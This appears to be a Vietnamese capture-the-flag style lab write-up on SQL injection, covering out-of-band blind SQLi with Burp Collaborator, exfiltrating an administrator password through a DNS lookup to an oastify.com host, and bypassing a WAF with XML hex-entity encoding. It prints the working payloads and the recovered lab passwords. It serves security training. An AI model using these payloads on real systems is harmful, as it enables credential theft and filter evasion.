Burp Collaborator là công cụ hỗ trợ tốt nhất cho OAST (Out-of-band Application Security Testing), cho phép phát hiện khi payload gây ra các truy vấn DNS hoặc tương tác mạng khác.

📜**LAB 16: SQLI MÙ VỚI TƯƠNG TÁC NGOÀI BĂNG TẦN**

Kết hợp SQL injection với các kỹ thuật XXE cơ bản để kích hoạt tương tác với máy chủ Collaborator

`TrackingId=D4y6jHchh7aruq4h'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//839gscx9qlg5tezp5sq8uiq26tck0eo3.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/28dead5c-18d5-4e5f-a00d-2c7155132dd5" />
📜**LAB 17: SQLI MÙ VỚI VIỆC RÒ RỈ DỮ LIỆU NGOÀI BĂNG TẦN**

Bước 1: Kết hợp SQL injection với các kỹ thuật XXE cơ bản để kích hoạt tương tác với máy chủ Collaborator
`TrackingId=8OX8Shu2vWVMhigB'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.39aby734wgm0z95kbnw30dwxcoig66uv.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

Bước 2: Nhấn vào Thăm dò ngay 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9ba79b6f-b342-4051-b8df-b7ef0fed12a5" />
- Đối với tương tác DNS, tên miền đầy đủ đã được tra cứu sẽ được hiển thị trong tab Description.
- Đối với tương tác HTTP, tên miền đầy đủ sẽ được hiển thị trong tiêu đề Máy chủ trong tab Request to Collaborator 
***Mật khẩu là: v1n07xu0updrfx8tzfxy***

---

##### 2.1.6 SQLi bậc 2:
- **SQL injection cấp một (first-order)**: xảy ra ngay tại thời điểm ứng dụng nhận dữ liệu đầu vào từ người dùng và chèn trực tiếp vào truy vấn SQL không an toàn.
- **SQL injection cấp hai (second-order)**: dữ liệu đầu vào được người dùng gửi đến và lưu trữ (thường trong cơ sở dữ liệu) mà chưa gây ra lỗi. Ở một yêu cầu khác, ứng dụng truy xuất dữ liệu đã lưu và chèn nó vào truy vấn SQL không an toàn, khi đó lỗ hổng mới xảy ra. Vì vậy còn gọi là SQL injection lưu trữ.


--- 
#### 2.2 Phát hiện SQLi trong các bối cảnh khác nhau
SQL Injection không chỉ giới hạn ở query string mà có thể chèn qua mọi định dạng đầu vào được xử lý thành SQL, và có thể né bộ lọc bằng cách mã hóa hoặc thoát ký tự.

📜**LAB 18: SQLI VỚI KỸ THUẬT VƯỢT QUA BỘ LỘC BẰNG MÃ HÓA XML**
Bước 1: Thay thế ID bằng các biểu thức toán học có thể đánh giá theo các ID tiềm năng khác
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d47ab3ee-f61f-4644-93af-301c621aacaa" />
Bước 2: Xác định số cột được trả về bởi truy vấn gốc bằng cách thêm một UNION SELECT vào ID cửa hàng gốc:
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/027e40b2-417d-4152-9c69-fc7d059af7dc" />
Yêu cầu của bạn đã bị chặn do bị đánh dấu là có khả năng bị tấn công

Bước 3: Sử dụng tiện ích Hackvertor để gửi lại yêu cầu và ta nhận được phản hồi bình thường -> Điều này đã vượt qua WAF thành công
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b76832e0-9f28-4eb1-ab99-c9fa68c66efa" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/820aba84-a41c-4621-a117-ffca5aed926e" />
Bước 4: Suy ra rằng truy vấn trả về một cột duy nhất. Khi bạn cố gắng trả về nhiều hơn một cột, ứng dụng sẽ trả về lỗi 0 units .
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ec011fe3-bb6c-4001-8b36-f09aa98e8534" />
Bước 5: Vì chỉ có thể trả về một cột nên cần nối các tên người dùng và mật khẩu được trả về: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/67e4327e-1fd6-4705-9e0b-feda5f0c180b" />
**Mật khẩu: l3j27vh6n4gyywn89t26**

### 3. Lỗi SQL Injection trên các hàm SELECT, INSERT, UPDATE, DELETE
#### 3.1 Lỗi SQL Injection trên các hàm SELECT

#### 3.2 Lỗi SQL Injection trên các hàm INSERT
#### 3.3 Lỗi SQL Injection trên các hàm UPDATE
#### 3.4 Lỗi SQL Injection trên các hàm DELETE
